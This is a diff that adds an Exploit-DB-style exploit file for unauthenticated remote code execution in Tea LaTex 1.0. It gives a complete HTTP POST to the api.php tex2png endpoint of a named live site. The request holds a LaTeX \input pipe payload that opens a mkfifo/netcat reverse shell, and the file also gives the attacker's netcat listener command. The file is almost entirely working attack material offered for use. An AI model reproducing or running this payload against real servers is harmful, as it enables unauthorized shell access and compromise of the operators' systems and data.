@@ -1,0 +1,41 @@
+# Exploit Title: Tea LaTex 1.0 - Remote Code Execution (Unauthenticated)
+# Google Dork: N/A
+# Date: 2020-09-01
+# Exploit Author: nepska
+# Vendor Homepage: https://github.com/ammarfaizi2/latex.teainside.org
+# Software Link: https://github.com/ammarfaizi2/latex.teainside.org
+# Version: v1.0
+# Tested on: Kali linux / Windows 10
+# CVE: N/A
+
+
+# Header Requests
+
+POST /api.php?action=tex2png HTTP/1.1
+Host: latex.teainside.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: */*
+Accept-Language: id,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 64
+Origin: https://latex.teainside.org
+DNT: 1
+Connection: keep-alive
+Referer: https://latex.teainside.org/
+Cookie: __cfduid=d7e499dd5e2cf708117e613f7286aa2021599260403
+
+
+{"content":"\documentclass{article}\begin{document}\input{|"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 1234 >/tmp/f"}\end{document}","d":200,"border":"50x20","bcolor":"white"}
+
+
+
+
+# Payload 
+
+\documentclass{article}\begin{document}\input{|"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 1234 >/tmp/f"}\end{document}
+
+
+# Attacker 
+
+nc -lvp 1234
